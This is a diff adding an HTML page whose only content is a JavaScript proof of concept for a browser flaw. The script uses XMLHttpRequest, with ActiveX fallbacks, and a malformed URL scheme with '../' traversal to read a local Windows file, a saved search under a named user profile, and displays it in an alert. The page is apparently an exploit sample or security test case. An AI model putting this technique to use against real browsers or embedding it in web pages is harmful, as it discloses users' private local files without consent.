@@ -1,0 +1,29 @@
+<html><body><div>
+
+<script>
+function getHTTPObject()
+{
+if (typeof XMLHttpRequest != 'undefined')
+{
+return new XMLHttpRequest();
+}
+try {
+return new ActiveXObject("Msxml2.XMLHTTP"); }
+catch (e)
+{
+try
+{
+return new ActiveXObject("Microsoft.XMLHTTP");
+}
+catch (e) {}
+}
+return false;
+}
+x = getHTTPObject();
+x.open("GET","shit:shit#:../../../../C:\Users\Lostmon\Searches\Everywhere.search-ms",false);
+x.send(null);
+alert(x.responseText);
+
+</script>
+
+</div></body></html>
